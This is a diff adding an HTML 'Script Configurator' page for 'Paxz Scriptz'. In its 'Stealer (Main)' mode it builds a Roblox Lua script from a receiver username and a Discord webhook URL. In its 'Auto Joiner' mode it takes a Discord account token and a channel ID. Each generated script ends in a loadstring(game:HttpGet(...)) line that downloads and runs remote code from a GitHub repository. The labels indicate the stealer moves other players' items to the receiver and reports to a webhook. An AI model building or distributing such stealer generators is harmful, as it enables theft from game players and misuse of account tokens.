@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Configurator | Paxz Scriptz</title>
+    <style>
+        :root { --bg: #050505; --card: #0f0f0f; --accent: #8a2be2; --text: #ffffff; --text-dim: #a0a0a0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; min-height: 100vh; }
+        
+        nav { display: flex; justify-content: space-between; padding: 20px 8%; background: rgba(0,0,0,0.9); border-bottom: 1px solid #1a1a1a; }
+        .logo { font-size: 24px; font-weight: 800; text-decoration: none; color: white; }
+        .logo span { color: var(--accent); }
+
+        .container { max-width: 900px; margin: 80px auto; padding: 0 20px; }
+        .config-wrapper { background: var(--card); padding: 50px; border-radius: 20px; border: 1px solid #1a1a1a; box-shadow: 0 30px 60px rgba(0,0,0,0.5); }
+        
+        .selector-tabs { display: flex; gap: 10px; margin-bottom: 35px; background: #000; padding: 5px; border-radius: 8px; }
+        .tab { flex: 1; padding: 12px; text-align: center; cursor: pointer; border-radius: 6px; transition: 0.3s; font-weight: 700; color: var(--text-dim); }
+        .tab.active { background: var(--accent); color: white; }
+
+        .input-group { margin-bottom: 25px; }
+        label { display: block; margin-bottom: 12px; color: var(--text-dim); font-size: 14px; font-weight: 600; text-transform: uppercase; }
+        input { width: 100%; padding: 16px; background: #000; border: 1px solid #222; border-radius: 8px; color: white; font-size: 16px; transition: 0.3s; }
+        input:focus { border-color: var(--accent); outline: none; box-shadow: 0 0 15px rgba(138, 43, 226, 0.2); }
+
+        .btn-gen { width: 100%; background: var(--accent); color: white; padding: 18px; border-radius: 8px; font-weight: 800; border: none; cursor: pointer; font-size: 18px; text-transform: uppercase; margin-top: 10px; }
+        
+        #result-section { margin-top: 40px; display: none; animation: fadeIn 0.5s ease; }
+        .code-box { background: #000; border: 1px solid var(--accent); border-radius: 8px; position: relative; }
+        textarea { width: 100%; height: 180px; background: transparent; color: #dcdcdc; padding: 20px; border: none; font-family: 'Consolas', monospace; font-size: 14px; resize: none; outline: none; }
+        .copy-btn { position: absolute; top: 10px; right: 10px; background: #1a1a1a; color: white; border: 1px solid #333; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 12px; }
+        .copy-btn:hover { background: #333; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="index.html" class="logo">Paxz<span>Scriptz</span></a>
+        <div class="nav-links">
+            <a href="scripts.html" style="color: var(--text-dim); text-decoration: none;">&larr; Back to Catalog</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="config-wrapper">
+            <h2 style="margin-top: 0; font-size: 2rem;">Script Configurator</h2>
+            
+            <div class="selector-tabs">
+                <div class="tab active" id="tab-stealer" onclick="switchMode('stealer')">Stealer (Main)</div>
+                <div class="tab" id="tab-autojoin" onclick="switchMode('autojoin')">Auto Joiner</div>
+            </div>
+
+            <div id="inputs-container">
+                <!-- Inputs veranderen dynamisch via JS -->
+            </div>
+
+            <button class="btn-gen" onclick="generateCode()">Generate Executable</button>
+
+            <div id="result-section">
+                <label>Your Ready-to-use Script:</label>
+                <div class="code-box">
+                    <button class="copy-btn" onclick="copyToClipboard()">Copy Code</button>
+                    <textarea id="output-code" readonly></textarea>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentMode = 'stealer';
+
+        function switchMode(mode) {
+            currentMode = mode;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.getElementById(`tab-${mode}`).classList.add('active');
+            renderInputs();
+            document.getElementById('result-section').style.display = 'none';
+        }
+
+        function renderInputs() {
+            const container = document.getElementById('inputs-container');
+            if (currentMode === 'stealer') {
+                container.innerHTML = `
+                    <div class="input-group">
+                        <label>Receiver Username</label>
+                        <input type="text" id="val1" placeholder="Roblox username to receive items">
+                    </div>
+                    <div class="input-group">
+                        <label>Discord Webhook URL</label>
+                        <input type="text" id="val2" placeholder="https://discord.com/api/webhooks/...">
+                    </div>
+                `;
+            } else {
+                container.innerHTML = `
+                    <div class="input-group">
+                        <label>Discord Token</label>
+                        <input type="text" id="val1" placeholder="Your account token">
+                    </div>
+                    <div class="input-group">
+                        <label>Target Channel ID</label>
+                        <input type="text" id="val2" placeholder="Channel ID for logs">
+                    </div>
+                `;
+            }
+        }
+
+        function generateCode() {
+            const val1 = document.getElementById('val1').value;
+            const val2 = document.getElementById('val2').value;
+            let finalScript = "";
+
+            if (currentMode === 'stealer') {
+                finalScript = `_G.username = "${val1}"\n_G.webhook = "${val2}"\n\nloadstring(game:HttpGet('https://raw.githubusercontent.com/deltamokey-arch/PaxzScriptz/refs/heads/main/Main'))()`;
+            } else {
+                finalScript = `_G.DISCORD_TOKEN = "${val1}"\n_G.CHANNEL_ID = "${val2}"\n\nloadstring(game:HttpGet('https://raw.githubusercontent.com/deltamokey-arch/PaxzScriptz/refs/heads/main/AutoJoiner.lua'))()`;
+            }
+
+            document.getElementById('output-code').value = finalScript;
+            document.getElementById('result-section').style.display = 'block';
+        }
+
+        function copyToClipboard() {
+            const copyText = document.getElementById("output-code");
+            copyText.select();
+            document.execCommand("copy");
+            alert("Script copied to clipboard!");
+        }
+
+        // Check URL params om direct de juiste tab te openen
+        const urlParams = new URLSearchParams(window.location.search);
+        if(urlParams.get('type') === 'autojoin') switchMode('autojoin');
+        else renderInputs();
+    </script>
+</body>
+</html>
